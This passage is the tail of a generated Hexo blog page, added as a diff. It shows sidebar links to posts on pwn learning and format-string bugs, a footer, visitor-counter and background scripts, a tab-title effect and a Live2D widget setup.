class="post-list-link" href="/2019/12/09/Study/Study/">PWN渣渣的学习记录</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/12/08/Fmtstr/FmtStr_In_BSS/">FmtStr In BSS</a></li></ul>
+
+
+
+
+    <script>
+        
+    </script>
+
+</div>
+      <footer id="footer">
+	<script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+    <div class="outer">
+        <div id="footer-info">
+            <div class="footer-left">
+                <i class="fa fa-copyright"></i> 
+                2019-2020 风沐云烟
+            </div>
+            <div class="footer-right">
+                <a href="http://hexo.io/" target="_blank" title="A fast, simple &amp; powerful blog framework">Hexo</a>  Theme <a href="https://github.com/MOxFIVE/hexo-theme-yelee" target="_blank" title="Another simple and elegant theme for Hexo  v3.5">Yelee</a> by MOxFIVE <i class="fa fa-heart animated infinite pulse"></i>
+            </div>
+        </div>
+        
+            <div class="visit">
+                
+                    <span id="busuanzi_container_site_pv" style='display:none'>
+                        <span id="site-visit" title="Site Visitors"><i class="fa fa-area-chart" aria-hidden="true"></i><span id="busuanzi_value_site_uv"></span>
+                        </span>
+                    </span>
+                
+                
+                    <span>| </span>
+                
+                
+                    <span id="busuanzi_container_page_pv" style='display:none'>
+                        <span id="page-visit"  title="Page Hits"><i class="fa fa-coffee" aria-hidden="true"></i><span id="busuanzi_value_page_pv"></span>
+                        </span>
+                    </span>
+                
+            </div>
+        
+    </div>
+</footer>
+
+    </div>
+    
+<script data-main="/js/main.js" src="//cdn.bootcss.com/require.js/2.2.0/require.min.js"></script>
+
+    <script>
+        $(document).ready(function() {
+            var iPad = window.navigator.userAgent.indexOf('iPad');
+            if (iPad > -1 || $(".left-col").css("display") === "none") {
+                var bgColorList = ["#9db3f4", "#414141", "#e5a859", "#f5dfc6", "#c084a0", "#847e72", "#cd8390", "#996731"];
+                var bgColor = Math.ceil(Math.random() * (bgColorList.length - 1));
+                $("body").css({"background-color": bgColorList[bgColor], "background-size": "cover"});
+            }
+            else {
+                var backgroundnum = 6;
+                var backgroundimg = "url(/background/bg-x.jpg)".replace(/x/gi, Math.ceil(Math.random() * backgroundnum));
+                $("body").css({"background": backgroundimg, "background-attachment": "fixed", "background-size": "cover"});
+            }
+        })
+    </script>
+
+
+
+
+
+<div class="scroll" id="scroll">
+    <a href="#" title="Back to Top"><i class="fa fa-arrow-up"></i></a>
+    <a href="#comments" onclick="load$hide();" title="Comments"><i class="fa fa-comments-o"></i></a>
+    <a href="#footer" title="Go to Bottom"><i class="fa fa-arrow-down"></i></a>
+</div>
+<script>
+    // Open in New Window
+    
+        $("a[target=_blank]").removeAttr("target");
+    
+</script>
+
+    <script>
+        var originTitle = document.title;
+        var titleTime;
+        document.addEventListener("visibilitychange", function() {
+            if (document.hidden) {
+                document.title = "φ(≧ω≦*)♪ 嘿 ^我消失啦~ " + originTitle;
+                clearTimeout(titleTime);
+            }
+            else {
+                document.title = "Hi~ o(*￣▽￣*)ブ 被你发现啦～" + originTitle;
+                titleTime = setTimeout(function() {
+                    document.title = originTitle;
+                }, 2000);
+            }
+        })
+    </script>
+
+<script async src="https://dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js">
+</script>
+  </div>
+<script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"pluginModelPath":"assets/","model":{"jsonPath":"/live2dw/assets/z16.model.json"},"display":{"position":"right","width":180,"height":360},"mobile":{"show":true},"log":false,"pluginJsPath":"lib/","pluginRootPath":"live2dw/","tagMode":false});</script></body>
+</html>
